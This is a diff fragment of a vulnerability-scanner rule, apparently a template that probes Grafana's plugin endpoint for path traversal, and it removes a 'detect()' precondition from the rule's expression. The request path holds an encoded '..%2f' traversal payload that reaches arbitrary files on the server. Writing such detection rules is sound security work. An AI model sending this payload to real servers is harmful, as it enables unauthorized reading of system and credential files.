@@ -286,7 +286,7 @@ rules:
             path: /public/plugins/{{plugin}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{{file}}
         expression: |
             response.status == 200 && re.matches(response.body_string)
-expression: detect() && r0()
+expression: r0()
 detail:
     author: test
     links:
